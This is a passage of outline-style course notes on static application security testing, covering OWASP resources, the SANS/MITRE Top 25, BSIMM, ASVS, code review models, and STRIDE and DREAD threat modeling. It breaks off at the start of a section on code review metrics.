					® Threat agents (who may attack).

					® Attack vectors (how they attack).

					® Security controls to mitigate risks.

					® Technical and business impacts if successful.

		○ Importance of the Top 10

			§ Serves as a practical, widely accepted baseline for web application security.

			§ Translates academic or theoretical security issues into real-world attack scenarios.

			§ Freely available — lowering the barrier for developers and security teams to adopt best practices.

			§ Acts as a foundation for security testing, including static application security testing (SAST).



Other Notable Projects

	• While the OWASP Top 10 is the most famous, OWASP offers many other powerful resources and tools that support both static and dynamic application security testing. These projects provide guides, frameworks, and tools that help testers, developers, and organizations mature their security programs.

	• Key Concepts

		○ OWASP Web Security Testing Guide (WSTG)

			§ 200+ page PDF with detailed guidance.

			§ Organizes tests into 11 categories with 100+ individual tests.

			§ Provides instructions on tools and techniques.

			§ Used to build a baseline security profile before penetration testing.

			§ One of the most valuable resources for security testers.

		○ OWASP Code Review Guide

			§ 220 pages of detailed guidance.

			§ Explains why code reviews matter and what to look for.

			§ Includes code examples tied to OWASP Top 10 risks.

			§ Helps developers answer: “How exactly do we perform a code security review?”

		○ OWASP ZAP (Zed Attack Proxy)

			§ Web application proxy + vulnerability scanner.

			§ Allows testers to capture and manipulate traffic between client and server.

			§ Includes an automated vulnerability scanner (not as deep as commercial tools, but still effective).

			§ Any vulnerabilities it finds should be taken seriously.

		○ OWTF (Offensive Web Testing Framework)

			§ Aimed at penetration testers.

			§ Automates many web app security tests.

			§ Combines knowledge from:

				□ OWASP Testing Guide

				□ Penetration Testing Execution Standard (PTES)

				□ NIST guidance

			§ Goal: automate basic tests so testers can focus on complex ones.

		○ OWASP SAMM (Software Assurance Maturity Model)

			§ Provides a maturity model for software assurance.

			§ Based on five business functions:

				□ Governance

				□ Design

				□ Implementation

				□ Verification

				□ Operations

			§ Each function has three security practices, scored by maturity.

			§ Produces a clear picture of application security gaps.

		○ How to Use These Projects

			§ For static testing:

				□ Incorporate Testing Guide, Code Review Guide, and SAMM.

			§ For dynamic testing:

				□ Use Testing Guide again (applies to both static/dynamic).

				□ Use ZAP and OWTF for automation.

		○ OWASP Community Value

			§ OWASP continuously publishes and updates projects.

			§ All resources are free and extremely valuable.

			§ Testers and developers should:

				□ Leverage them in daily work.

				□ Contribute back to projects or share with security groups.

				□ Stay updated on new and evolving projects.



Top 25 Software Errors

	• The SANS Institute and MITRE Corporation collaborated to create the Top 25 Most Dangerous Software Errors, a resource that goes beyond the OWASP Top 10 by providing a deeper and broader look at software vulnerabilities. This list, grounded in MITRE’s CWE (Common Weakness Enumeration), gives security testers and developers more detailed insights into common coding errors, and practical ways to integrate them into Agile development.

	• Key Concepts

		○ Background on SANS Institute

			§ Founded in 1989, major provider of cybersecurity training and research.

			§ Known for multi-day training courses worldwide.

			§ Established GIAC certifications to validate practitioner skills in security.

		○ Background on MITRE

			§ Not-for-profit, federally funded R\&D organization.

			§ Works across defense, intelligence, homeland security, and cybersecurity.

			§ Maintains the CWE (Common Weakness Enumeration):

				□ A standardized “common language” for describing software weaknesses.

				□ Helps unify how vulnerabilities are defined and addressed.

		○ The Top 25 Software Errors

			§ In 2010, SANS + MITRE partnered to publish the Top 25 Most Dangerous Software Errors.

			§ Based on CWE data, but prioritized by severity and prevalence.

			§ More detailed than OWASP Top 10:

				□ Broader scope, deeper insights into software security risks.

			§ Limitation: Unlike OWASP Top 10, it’s not updated with the same consistency/due diligence.

		○ Practical Application in Agile Development

			§ Stephen Dye (AppSec expert \& CISO) authored “Secure Agile Development: 25 Security User Stories.”

			§ Combines the Top 25 errors with Agile methodology.

			§ Each error is mapped into a security user story format, including:

				□ Clear descriptions (developer-friendly language).

				□ Test steps.

				□ Acceptance criteria.

			§ Purpose: Helps developers integrate security testing naturally into Agile workflows.\\

		○ Importance for Security Testing

			§ OWASP Top 10 = baseline risks, widely adopted.

			§ SANS/MITRE Top 25 = deeper, broader coverage of dangerous coding errors.

			§ Using both helps testers and developers:

				□ Gain better coverage of risks.

				□ Communicate in a shared language (via CWE, Agile stories).

				□ Embed security earlier and more effectively.



BSIMM (Building Security in Maturity Model)

	• The BSIMM (Building Security in Maturity Model) provides a structured, maturity-based approach to improving software security. Unlike compliance frameworks, BSIMM helps organizations move beyond “checking the box” to addressing the root causes of vulnerabilities through systematic practices across governance, intelligence, software security touchpoints, and deployment.

	• Key Concepts

		○ Why BSIMM Matters

			§ Created by 100+ organizations across industries (heavily influenced by financial services and software vendors).

			§ Similar to OWASP SAMM, but broader and more industry-backed.

			§ Emphasizes: “Compliance ≠ Security” — real security comes from maturity.

			§ Vulnerabilities = symptoms, not the root problem → BSIMM focuses on addressing root causes.

		○ Structure of BSIMM

			§ 121 activities, grouped by:

				□ Three maturity levels:

					® Level 1 → basic activities.

					® Level 2 → intermediate.

					® Level 3 → mature, advanced.

				□ 12 practices within four domains.

		○ The Four Domains

			§ Governance (organize, manage, measure)

				□ Strategy \& Metrics → roles, responsibilities, budgets, KPIs.

				□ Compliance \& Policy → internal/external standards (e.g., HIPAA, PCI DSS).

				□ Training → build shared knowledge, common security language.

			§ Intelligence (create reusable artifacts)

				□ Attack Models → view from attacker’s perspective to prioritize risks.

				□ Security Features \& Design → reusable secure design patterns.

				□ Standards \& Requirements → technical control documentation building on policies.

			§ SSDL Touchpoints (hands-on security in SDLC)

				□ Architecture Analysis → validate diagrams and system design.

				□ Code Review → multiple roles, tools, and perspectives to catch flaws early.

				□ Security Testing → vulnerability analysis (static → informs dynamic).

			§ Deployment (secure release \& post-production)

				□ Penetration Testing → test if controls withstand attacks.

				□ Software Environment → OS, WAF, monitoring, change management.

				□ Configuration \& Vulnerability Management → patching, updates, defect \& incident management.

			§ Practical Use

				□ Recommended approach: start with one domain at a time to avoid overwhelm.

				□ BSIMM provides a roadmap for organizations to gauge current maturity, identify gaps, and improve systematically.

				□ Ties together governance, design, static/dynamic testing, and operations → full lifecycle coverage.



Building Your Test Lab

	• To perform effective static (and later dynamic) application security testing, you need a lightweight but well-prepared test lab. This involves using virtual machines, static code analysis tools, IDEs, and ultimately a structured checklist to ensure consistency and repeatability in testing.

	• Key Concepts

		○ Test Lab Setup with Virtual Machines

			§ Virtual Machines (VMs) provide an isolated, flexible environment for testing.

			§ Benefits: Easy to spin up, reset, and restore.

			§ Options:

				□ VMware Workstation Player: Popular, requires a license for commercial use.

				□ Oracle VirtualBox: Free, but sometimes requires extra configuration.

		○ Static Testing Focus

			§ While much static testing involves documentation review, hands-on code review is still critical.

			§ Requires tools that can scan and analyze source code for vulnerabilities.

		○ Core Static Code Analysis Tools

			§ Codacy:

				□ Cloud-based or enterprise edition.

				□ Integrates with GitHub/Bitbucket to analyze code on every commit or pull request.

				□ Detects quality and security issues.

			• SonarQube:

				□ Larger user base, similar to Codacy.

				□ Community Edition is free for local use.

				□ SonarCloud available for online code inspection.

			• Both tools provide broad language support and can serve as central pieces of the testing toolkit.

		○ Integrated Development Environments (IDEs)

			• IDEs are the tools developers use to write, test, and debug code.

			• Examples:

				□ Visual Studio (popular for .NET).

				□ Eclipse (common for Java).

			• Many IDEs now support multiple languages.

			• Security plugins exist for IDEs, allowing developers to secure code as they write it, making them an important part of proactive security.

		○ Next Step – Testing Checklist

			• Beyond tools, testers need a checklist.

			• Purpose:

				□ Ensure a consistent, repeatable testing process.

				□ Wrap together frameworks, maturity models (like SAMM \& BSIMM), and static testing tools.

			• This checklist bridges knowledge into practice, providing structure and reliability.



Preparing Your Checklist

	• A testing checklist is essential for creating a repeatable, consistent, and measurable static application security testing (SAST) process. By including pre-engagement activities, clearly defined scope, and alignment with organizational practices, the checklist ensures reliable results that improve security over time.

	• Key Concepts

		○ Purpose of a Checklist

			• A one-time test provides insights, but a checklist ensures repeatability and consistency.

			• Helps testers measure improvement across time.

			• Supports continuous security validation, not just compliance or busywork.

			• Ultimate goals of testing:

				□ Protect confidential data.

				□ Maintain application integrity.

				□ Ensure availability/reliability for users.

		○ Measurement and Metrics

			• Security tests should be results-driven.

			• Measuring outcomes helps determine if testing efforts are effective.

			• Fine-tuning the process is necessary as applications evolve.

			• Metrics will be covered in more depth later in the course.

		○ Pre-Engagement Interactions

			• Checklist should not start with tests — preparation is critical.

			• Pre-engagement activities determine success of testing.

			• Key components:

				□ Scope verification: What’s in scope vs. out of scope.

				□ Testing time frames: Static testing offers more flexibility than dynamic testing.

				□ Tools \& techniques: Document in advance and review with developers.

		○ Five Key Questions to Answer Before Testing

			• What development methodologies do we follow? (e.g., Waterfall, Agile, DevOps)

			• What programming languages do we use? (impacts SAST tools needed)

			• What risk or security frameworks do we follow? (ISO, NIST, CIS, etc.)

			• What third-party libraries do we use? (open-source dependency risks)

			• What stages in the development process require approval from security? (integration points for security reviews)

		○ Principle: “Measure Twice, Cut Once”

			• Jumping into tests without preparation risks missing issues.

			• Pre-engagement = “measuring twice.”

			• Reduces mistakes and increases efficiency of the testing phase.



#### Security Documentation



`Internal Project Plans

	• Integrating static application security testing (SAST) into internal project plans—especially for new deployments and significant changes—is an effective way to reduce remediation costs, improve security outcomes, and ensure security is treated as a core requirement alongside functionality and quality.

	• Key Concepts

		○ When to Use Project Plans for Security

			§ Waterfall: Common practice, naturally fits.

			§ Agile: Still useful, though lighter weight.

			§ DevOps: Different pace, but planning has value.

			§ Best fit scenarios:

				□ Brand new deployments → If it didn’t exist yesterday and will tomorrow, treat it as new.

				□ Significant changes → Indicators:

					® Adding entirely new functionality.

					® Rewriting code in a different programming language.

		○ Cost Savings of Early Security

			§ Forrester (2016): Fixing defects earlier saves 5–15x remediation costs.

			§ US-CERT guidance (historical): Security assurance ties closely with project management discipline.

		○ Embedding Security into the SDLC

			§ Requirement gathering: Document security requirements alongside functional ones.

			§ Design phase: Security should analyze designs as a malicious user would, feeding into dynamic test cases.

			§ Development phase:

				□ Perform source code security reviews (not just code reviews).

				□ Favor automated reviews, triggered on check-ins or even while a developer is away.

			§ Clarity \& Accountability in Security Tasks

				□ For each task, answer:

					® What is the task? → Define clearly, manual vs automated, and expected outcome.

					® Who is responsible? → Ensure individual accountability, not shared.

					® When is it due? → Set deadlines or tie to dependencies.

		○ Role of the Security Tester

			§ If you’re the tester (not PM), take initiative:

				□ Meet with the project/product manager to identify security touchpoints.

				□ Focus on static tests that add maximum value with minimal effort.

				□ Stress that security = quality.

				□ Advocate for automated source code security reviews as the ultimate goal.



Communication Planning

	• Effective communication and integration of security testing into an organization’s change control process is essential. Without structured planning, changes can unintentionally introduce security flaws. By understanding policies, procedures, and stakeholders—and adapting to models like ITIL or CI/CD—security testing can be embedded into every change cycle to reduce risk.

	• Key Concepts

		○ Importance of Change Control

			§ Organizations implement change control policies to reduce the risk of system/application issues from changes.

			§ Without structured control, changes are more likely to cause unexpected impacts.

			§ Security-related flaws (e.g., SQL injection, insecure data exposure) may go unnoticed by users but exploited by attackers.

			§ Security testing must be included in every scheduled change.

		○ Stakeholders in Change Control

			§ End users → directly impacted by changes.

			§ Developers → authors and maintainers of the code being changed.

			§ IT Infrastructure teams → support servers, networks, and databases underpinning applications.

			§ IT Audit teams → verify adherence to change processes.

		○ Policy vs. Procedures

			§ Change Control Policy → high-level rules.

			§ Procedures → detailed steps for:

				□ Proposing changes.

				□ Reviewing changes.

				□ Testing changes (before and after implementation).

			§ Must align with technical standards and security guidelines (e.g., 2FA must never be disabled).

		○ ITIL (Information Technology Infrastructure Library)

			§ Widely used framework for IT change control.

			§ Defines types of changes:

				□ Emergency

				□ Standard

				□ Major

				□ Normal

			§ Introduces CAB (Change Advisory Board) → cross-functional group to review potential impacts of changes.

		○ CI/CD vs. Traditional ITIL

			§ CI/CD pipelines focus on speed and automation:

				□ Automated security scans (e.g., SAST in pipeline).

				□ Code tested, compiled, and deployed without lengthy approvals.

			§ Contrasts with ITIL’s formal, review-heavy processes.

			§ Modern DevOps requires adapting security testing to frequent, rapid releases.

		○ Security Testing Alignment

			§ To integrate effectively:

				□ Understand how your organization promotes changes (ITIL vs. CI/CD).

				□ Choose the right security tools and techniques for that environment.

				□ Embed static and dynamic security testing into every change cycle.



Change Control Policy

	• An effective communication plan is essential when integrating static application security testing into projects. Clear, role-based, and audience-appropriate communication keeps everyone aligned, ensures that flaws are remediated promptly, and helps maintain project flow without unnecessary delays or misunderstandings.

	• Key Concepts

		○ Purpose of a Communication Plan

			§ Keeps everyone on the same page.

			§ Ensures awareness of testing activities, findings, and remediations.

			§ Helps coordinate impacts on schedules, resources, and responsibilities.

			§ Static testing is low-risk for production, but findings can still affect timelines.

		○ Core Questions to Answer

			§ Who is impacted?

				□ Identify roles (PMs, developers, testers, analysts, auditors).

				□ Best practice: use names, emails, and phone numbers.

			§ How are they impacted?

				□ PMs need high-level status (“task done or not”).

				□ Developers need detailed remediation instructions and deadlines.

			§ Workflow Considerations

				□ Clarify in advance:

					® Who performs testing.

					® How much time testing adds (minimize via automation).

					® Who reviews results (ideally a second set of eyes).

					® Who signs off on fixes/remediation.

				□ These roles/tasks should already be documented in the project plan.

		○ Communication Styles \& Channels

			§ Traditional methods: Weekly meetings, task-tracking emails.

			§ Agile methods: Daily standup meetings (short, focused).

			§ Modern tools: Real-time messaging (e.g., Slack) → quick feedback loops.

			§ Best practice: adapt communication to the team’s preference to improve adoption.

		○ Best Practices

			§ Always communicate from the audience’s perspective.

			§ Clearly state:

				□ Expectations.

				□ Required actions.

				□ Acknowledgment/completion signals (so tasks don’t fall through the cracks).

			§ Avoid assumptions (e.g., sending an email without ensuring it was read/understood).



Security Incident Response Policy

	• Security incident response policies define how organizations prepare for and respond to threats. By understanding these policies—and the distinctions between events, incidents, and breaches—application security testers can better design static testing activities, align with organizational priorities, and involve the right stakeholders.

	• Key Concepts

		○ Terminology Matters

			§ Security Event → A logged activity (success/failure, benign or suspicious).

			§ Security Incident → Analyzed event(s) that confirm an active threat requiring action.

			§ Security Breach → A subset of incidents involving data loss or exposure.

				□ Example: DoS = incident, but not necessarily a breach.

		○ CIA Triad (Impact Categories)

			§ Most security incidents affect one of three areas:

				□ Confidentiality → Unauthorized disclosure of data.

				□ Integrity → Unauthorized alteration of data.

				□ Availability → Denial of access or service outages.

			§ Connection to Static Application Security Testing (SAST)

				□ SAST exists to find and fix vulnerabilities before attackers exploit them.

				□ Reviewing your org’s incident response policies informs:

					® Which vulnerabilities matter most.

					® Which stakeholders should be included in planning.

					® How to align test priorities with organizational risk exposure.

		○ Key Documentation

			§ Security Incident Response Policy → Defines scope \& responsibilities.

			§ Security Incident Response Plan → Broader execution framework.

			§ Incident Response Procedures/Playbooks → Step-by-step guides for responders under pressure.

				□ High value: tickets from actual incidents → reveal attack vectors (especially if app-related).

		○ Industry Guidance

			§ NIST SP 800-61 Rev. 2: Comprehensive guide on incident handling.

				□ Covers: building teams, equipping them, handling incidents, and internal/external communication.

				□ Mentions applications 44 times → strong tie to AppSec testing relevance.

			§ Practical Takeaway for Testers

				□ Incorporating incident response context into SAST makes your testing:

					® More useful → addresses real-world threats.

					® More relevant → aligned with organizational priorities.

					® More integrated → brings in stakeholders you might otherwise miss.



Logging and Monitoring Policy

	• Effective logging and monitoring policies are critical for detecting, responding to, and preventing security incidents. Weak or missing log controls can make it impossible to determine what happened during an incident. Application security testing (especially static testing) must include reviewing how applications generate, protect, and store logs to ensure compliance, incident response readiness, and long-term forensic capability.

	• Key Concepts

		○ Importance of Logging \& Monitoring

			§ Without logs, organizations can’t investigate incidents or determine data theft.

			§ Weak/nonexistent logging = potential business-ending risk.

			§ Logging = foundation; Monitoring (SIEM) = analysis and response layer.

		○ Log Management vs. SIEM

			§ Log Management → Collects and stores system \& application logs for long-term access.

			§ Security Information and Event Management (SIEM) → Analyzes logs in near real-time to detect threats, generate alerts, or trigger automated responses.

			§ Together form a layered pyramid: log management as the base, SIEM as the pinnacle.

		○ Four Questions for Static Testing of Logging

			§ Can the app generate logs?

				□ If not, it may not be production-ready.

			§ Are logs compliant with internal/external requirements?

				□ Policy review determines what must be captured.

			§ Are logs sufficient for near-term incident response?

				□ Should support quick analysis in case of an attack.

			§ Are logs sufficient for long-term forensics?

				□ Must provide meaningful data even a year later.

		○ Standards \& Guidance

			§ NIST SP 800-92 → Guide to Computer Security Log Management; covers infrastructure, log file content, and operational processes.

			§ PCI DSS Section 10 → Simple, concise guidance on events to log and required log contents. Great baseline for developers.

			§ Intelligence Community Standard (ICS) 500-27 → Comprehensive government-grade requirements, including auditable events, log elements, and compromise indicators.

		○ Application Security Testing Implications

			§ Static tests should review the code responsible for generating and protecting logs.

			§ Logging \& monitoring requirements should be built into app design.

			§ Logs are crucial for dynamic testing later (validating security behavior in production-like settings).



Third-Party Agreements

	• Cloud services, SaaS, and third-party developers are now standard in business operations. Since internal teams usually cannot directly test third-party applications, organizations must manage third-party security risk through identification, documentation, contractual requirements, and vulnerability assessments—including for open-source libraries.

	• Key Concepts

		○ Third-Party Risk in Security Testing

			§ You may be authorized to test internal applications, but not third-party apps.

			§ You may be authorized to test internal applications, but not third-party apps.

			§ Using third-party apps extends trust outside the traditional perimeter.

			§ Risk: Attackers may target the weaker third-party vendor rather than the stronger internal org.

			§ Example: A mobile app linked a critical function to a developer’s personal domain instead of the organization’s.

		○ Identifying Third-Party Dependencies

			§ Start with:

				• Purchasing dept. → records of SaaS solutions.

				• Legal dept. → contracts and agreements.

				• Security team → firewall logs showing outbound connections.

				• Risk management team → may track vendor assessments.

				• End users → ask: “What websites do you log into for your job?”

			§ Contractual Security Requirements

				• Work with purchasing and legal to put requirements in writing.

				• Common inclusions:

					® Compliance expectations → vendor must show evidence of alignment with frameworks (ISO 27001, NIST CSF, CIS).

					® Internal security standards → can be required but burdensome for vendors with many clients.

					® Liability clauses → more effective than compliance language; makes vendor financially responsible for damages from insecure code.

				• Example: Dropbox blog on better vendor security assessments

		○ Open-Source Libraries

			§ Unlike vendors, open-source projects have no contracts.

			§ Still must identify and assess open-source dependencies in applications.

			§ Tools for vulnerability detection:

				• Sonatype OSS Index → search engine for vulnerable components (Go, RubyGems, Drupal, etc.).

				• OWASP Dependency-Check → supports Java \& .NET, with experimental support for Ruby, Node.js, Python.

				• Bundler Audit (Ruby) → checks for patch-level verification in Bundler-managed projects.

		○ Implications for Static Application Security Testing (SAST)

			§ Security testers should:

				• Map out third-party SaaS and developer dependencies.

				• Ensure contracts include security, compliance, and liability terms.

				• Scan and verify open-source libraries for known vulnerabilities.

			§ Key principle: Trust but verify—don’t rely on vendor assurances alone.



OWASP ASVS

	• The OWASP Application Security Verification Standard (ASVS) provides a structured framework to measure, test, and communicate application security requirements. It helps organizations align with maturity goals, set expectations with vendors, and verify whether apps meet appropriate levels of security assurance through static and dynamic testing.

	• Key Concepts

		○ Purpose of OWASP ASVS

			§ Aids communication between developers, testers, and vendors.

			§ Provides metrics to track application security maturity.

			§ Offers procurement support → organizations can set security requirements for third-party developers.

			§ Functions as a capability maturity model for application security.

		○ ASVS Security Levels

			§ Level 1 (Low assurance):

				□ Focus on basic security controls.

				□ Suitable for apps that don’t handle sensitive data.

				□ Good starting point for teams new to application security.

			§ Level 2 (Standard assurance):

				□ Applies to most applications, especially those handling sensitive or regulated data.

				□ Recommended for apps under HIPAA, PCI DSS, or similar compliance frameworks.

			§ Level 3 (High assurance):

				□ For business-critical applications (24/7 availability, core to the business).

				□ Most effort-intensive to achieve, but provides the highest assurance.

		○ Structure of ASVS

			§ 14 Control Objectives (categories of security controls), e.g.:

				□ Authentication

				□ Session management

				□ Error handling

				□ Stored cryptography

			§ Requirements under each objective:

				□ Define specific security behaviors or features (e.g., algorithms, secrets management).

				□ Tagged with security levels (1–3) based on assurance strength.

		○ CWE Mapping

			§ Each requirement maps to CWE (Common Weakness Enumeration).

			§ Ensures consistency with MITRE/SANS Top 25 software errors.

			§ Helps testers focus on real, common weaknesses.

		○ Application in Testing

			§ ASVS requirements can be verified with:

				□ Static tests (SAST).

				□ Dynamic tests (DAST).

				□ Or a combination depending on organizational approach.

			§ Provides guardrails → helps teams design and prioritize testing activities effectively.



#### Source Code Security Reviews



Challenges of Assessing Source Code

	• Source code reviews for functionality and source code security reviews serve different purposes. While functional reviews confirm that the application works as intended, security reviews assess resilience against attacks, requiring both automated and manual approaches. Implementing code security reviews effectively involves process standardization, tooling, training, and overcoming cultural and resource challenges.

	• Key Concepts

		○ Difference Between Code Review and Code Security Review

			§ Code Review: Ensures functionality (e.g., ZIP Code field lookup works correctly).

			§ Code Security Review: Ensures resilience (e.g., test unexpected input, SQL injection, buffer overflows).

			§ Functional tests may pass while critical vulnerabilities remain undiscovered.

		○ Attacker’s Perspective

			§ Security testing must assume unexpected or malicious input.

			§ Even trivial functions (like ZIP Code lookups) can reveal insecure coding patterns that attackers might exploit elsewhere (e.g., sensitive data tables).

		○ Automated vs. Manual Reviews

			§ Automated Reviews:

				□ Fast, scalable, necessary to meet deadlines.

				□ Cover large codebases quickly.

			§ Manual Reviews:

				□ Provide training and education for developers.

				□ Help developers learn to write secure code the first time.

				□ Identify logic flaws automation might miss.

			§ Best practice: Use both in tandem.

		○ Organizational and Process Challenges

			§ Well-defined processes: Testing cannot be haphazard—prototype, document, iterate.

			§ Resources: Need people with security expertise (in both the security and development teams).

			§ Tools: Free/open-source options exist, but commercial tools may be necessary (cost + training curve).

			§ Timeline pushback: Security testing must be integrated into project planning, not tacked on last-minute.

			§ Training: Developers, testers, and stakeholders need awareness of the process and its value.

		○ Cultural Shift

			§ Developers and testers must understand why secure coding and security reviews matter.

			§ Consistent application of security reviews builds long-term improvements in secure development practices.



OWASP Code Review Guide

	• The OWASP Code Review Guide is a foundational resource for performing source code security reviews, helping organizations integrate secure coding practices into the SDLC. It provides methodology, threat modeling frameworks, practical examples, and aligns with the OWASP Top 10 to improve both static and dynamic application security testing.

	• Key Concepts

		○ Purpose and Scope

			§ Step-by-step framework for performing source code security reviews.

			§ Explains what a code security review is, how to scope it, and how to couple it with penetration testing.

			§ Integrates reviews into the Software Development Life Cycle (SDLC).

		○ Alignment and Practical Guidance

			§ Aligned with the OWASP Top 10 risks.

			§ Provides specific code snippets showing how vulnerabilities may appear in source code.

			§ Shows what to review and how to validate defenses.

			§ Includes internal and external references (e.g., MITRE, Usenix, php.net, Microsoft).

		○ Integration with Other OWASP Resources

			§ Complements the OWASP Testing Guide:

				□ Code Review Guide = Static Application Security Testing (SAST).

				□ Testing Guide = Dynamic Application Security Testing (DAST).

			§ Using both together strengthens application security testing.

		○ Risk and Threat Modeling

			§ Promotes a risk-based approach to prioritize testing.

			§ Emphasizes maturity and business drivers to align security testing with organizational priorities.

			§ Uses threat modeling techniques:

				□ STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege).

				□ DREAD (Damage, Reproducibility, Exploitability, Affected Users, Discoverability).

			§ Helps apply likelihood × impact scoring to prioritize vulnerabilities.

		○ Audience

			§ The guide is designed for three key groups:

				□ Management – Understands why reviews matter, even if not hands-on.

				□ Software leads – Bridges the gap between code reviews and code security reviews.

				□ Code security reviewers – Hands-on practitioners performing the detailed analysis.

		○ Process Considerations

			§ Factors to plan reviews:

				□ Number of lines of code.

				□ Programming languages used.

				□ Available resources and time constraints.

			§ Larger, more complex applications require deeper reviews.

			§ If time/resources are lacking → supplement with additional dynamic testing.

		○ Value Proposition

			§ Prevents teams from being overwhelmed by scope.

			§ Provides a practical, structured methodology that empowers testers and developers.

			§ Encourages adoption across the organization by balancing technical, managerial, and developer perspectives.



Static Code Analysis

	• Static code analysis is critical for application security testing, and automation is essential to achieve comprehensive coverage. Choosing the right tool depends on programming language, cost, support, and organizational needs.

	• Key Concepts

		○ Automation is Essential

			§ Manual reviews alone aren’t scalable.

			§ Automated scanners are required to cover large codebases and consistently detect vulnerabilities.

		○ Language-Specific Tools

			§ Tools must align with the programming language(s) in use.

				□ Bandit → Python security linter.

				□ Brakeman → Ruby on Rails applications.

				□ Puma Scan → C# with real-time scanning.

			§ Using the wrong tool for a language = ineffective (e.g., Bandit on C#).

		○ Cost Considerations

			§ Open-source tools:

				□ Pros → Free, community-driven.

				□ Cons → Requires more manual troubleshooting, limited support.

			§ Commercial tools:

				□ Pros → Paid support, enterprise features.

				□ Cons → Expensive, may include unnecessary complexity (“Aston Martin vs Honda Civic”).

		○ Tool Selection Process

			§ Identify languages in use (from documentation review).

			§ Match tools to languages.

			§ Balance cost vs. support vs. complexity.

			§ Experiment with candidate tools before adopting.

		○ OWASP Resources

			§ OWASP List of Source Code Analysis Tools → Neutral, includes open-source \& commercial options.

			§ OWASP Phoenix Chapter Tools Page → Archived but very comprehensive (covers analyzers, fuzzers, SQLi scanners, etc.).

		○ Organizational Fit

			§ No “one-size-fits-all” solution.

			§ Choice depends on:

				□ Programming languages.

				□ Security budget.

				□ Internal capabilities to support/maintain tools.



Code Review Models

	• Secure code reviews can be conducted at different maturity levels, from informal manual approaches to fully automated systems. The right model depends on organizational resources, risk tolerance, and priorities. Effective reviews should be structured, incremental, supportive, and aligned with internal standards and industry best practices like OWASP.

	• Key Concepts

		○ Code Review Models (increasing maturity)

			§ Over-the-Shoulder: Informal, one developer explains code while another watches.

			§ Pass-Around: Multiple reviewers provide feedback asynchronously.

			§ Walkthrough: Team meets, reviews code together, identifies specific required changes.

			§ Fully Automated: Tools and test cases perform reviews; humans only handle exceptions.

		○ Factors in Choosing a Model

			§ Processes, resources, tools, timelines, training (organizational readiness).

			§ Risk appetite of leadership (CFO, CISO, executives).

			§ Budget constraints (may limit automation options).

		○ Best Practices for Secure Code Reviews

			§ Use OWASP Code Review Guide: checklist of pass/fail questions, applied incrementally (e.g., focus on cryptography, then sessions).

			§ Review manageable chunks: Don’t review too many lines or checklist items at once.

			§ Avoid public shaming: Focus on positive reinforcement and education.

			§ Align with internal standards: Ensure consistency with documented expectations.

		○ Application Security Standards

			§ OWASP Top 10 → lightweight option.

			§ OWASP Code Review Guide Checklist → more detail.

			§ OWASP Application Security Verification Standard (ASVS) → advanced maturity model.

			§ Policy Frameworks → OWASP guidance tied to COBIT, ISO, Sarbanes-Oxley.



Application Threat Modeling: STRIDE

	• The STRIDE model, created by Microsoft, is a systematic framework for identifying six categories of threats to applications (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege). It helps developers and security teams anticipate attacks, think like adversaries, and design mitigations before vulnerabilities are exploited.

	• Key Concepts

		○ What is STRIDE?

			§ Developed by Microsoft (2009) to help defenders evaluate threats to confidentiality, integrity, and availability (CIA) of applications and data.

			§ Mnemonic STRIDE makes threat categories easy to remember.

		○ Six STRIDE Threat Categories

			§ Spoofing (S)

				□ Attacker pretends to be another user (e.g., stolen password).

				□ Risk to authenticity of transactions.

				□ Consider how credentials could be stolen and misused.

			§ Tampering (T)

				□ Unauthorized modification of data (e.g., SQL injection, intercepting transactions).

				□ Risk to integrity of data (at rest or in motion).

			§ Repudiation (R)

				□ Attacker denies performing an action due to lack of evidence/trail.

				□ Risk to non-repudiation (who did what, and when).

				□ E.g., triggering transactions without logs or proof.

			§ Information Disclosure (I)

				□ Exposure of sensitive or configuration data to unauthorized users.

				□ Risk to confidentiality.

				□ Examples: leaked medical records, exposed config files.

			§ Denial of Service (D)

				□ Disruption of service for legitimate users (e.g., DDoS, account lockout abuse).

				□ Risk to availability of the application.

			§ Elevation of Privilege (E)

				□ Attacker gains higher-level access than authorized (e.g., admin rights).

				□ Risk to authorization controls.

				□ Can lead to full application compromise.

		○ Practical Use of STRIDE

			§ Conduct brainstorming sessions with stakeholders to map threats to applications.

			§ Goal: identify 20–40 threats in 2 hours (likely even more with today’s data).

			§ Success requires at least one participant who thinks like an attacker.

			§ Encourage open, creative exploration (pizza + open web searches suggested).



Application Threat Modeling: DREAD

	• DREAD is a threat modeling framework (originated at Microsoft, also covered in the OWASP Code Review Guide) designed to simplify discussions around risk by breaking threats into five attributes: Damage, Reproducibility, Exploitability, Affected Users, Discoverability.

		○ Unlike STRIDE, which classifies threat types, DREAD helps quantify and prioritize risks by scoring them.

		○ Though Microsoft stopped using it in 2008, it remains useful for organizations to structure risk conversations and remediation prioritization.

	• Key Concepts

		○ Origins \& Purpose

			§ Developed by Microsoft, included in OWASP Code Review Guide.

			§ Not meant as a rigorous standard, but as a practical, lightweight framework.

			§ Purpose: structure risk analysis, assign scores, and prioritize remediation.

		○ The Five DREAD Attributes

			§ Damage (D) → Impact if the attack succeeds

				□ Maps to Impact in NIST risk models.

				□ Key questions:

					® How severe would the damage be?

					® Could attacker take full control or crash the system?

			§ Reproducibility (R) → Likelihood of attack success

				□ Maps to Likelihood in risk models.

				□ Key questions:

					® How easy is it to reproduce the attack?

					® Can the exploit be automated?

			§ Exploitability (E) → Effort required for attack

				□ Concerns time, skill, and authentication needs.

				□ Key questions:

					® How much expertise and effort is required?

					® Does attacker need valid credentials?

			§ Affected Users (A) → Scope of impact

				□ Considers who is impacted (regular vs. admin users).

				□ Key questions:

					® What % of users would be affected?

					® Could attacker escalate to admin access?

			§ Discoverability (D) → Likelihood attackers find the vulnerability

				□ Focus on how obvious the vulnerability is.

				□ Key question:

					® How easy is it for an attacker to discover this threat?

				□ Note: security by obscurity is weak, but obscurity can delay exploitation.

		○ Practical Application

			§ Originally used by Microsoft to decide:

				□ Fix in next release?

				□ Issue a service pack?

				□ Release urgent bulletin?

			§ Organizations can adapt scoring models (e.g., 1–10 per attribute) to rank and prioritize threats.

			§ Helps teams decide when and how to apply fixes based on objective scoring.



Code Review Metrics

	• Application security metrics must be tailored to the audience (executives, managers, developers) to be meaningful and actionable. Different stakeholders care about different outcomes: value vs. resources vs. technical gaps. Using frameworks like OWASP metrics projects and the Application Security Verification Standard (ASVS) can guide metric selection.

	• Key Concepts

		○ Purpose of Metrics

			§ Metrics allow organizations to measure effectiveness, cost vs. value, and progress in application security.

			§ Wrong metrics for the wrong audience = wasted effort.

		○ Audience-Centric Metrics

			§ Executives

